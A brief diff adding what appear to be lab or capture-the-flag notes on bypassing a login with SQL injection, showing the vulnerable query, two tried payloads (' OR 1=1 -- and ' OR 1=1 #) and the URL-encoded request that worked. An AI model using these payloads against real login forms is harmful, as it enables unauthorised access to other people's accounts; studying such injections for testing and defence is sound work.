@@ -1,0 +1,9 @@
+username=victim
+
+SELECT * FROM users WHERE username='victim' AND pw='$password';
+
+Iterations of password
+$password = ' OR 1=1 -- (MySQL error)
+          = ' OR 1=1 # (IT WORKED! Looks like the comment line was the issue.)
+
+username=victim&password=%27%20OR%201%3D1%20%23
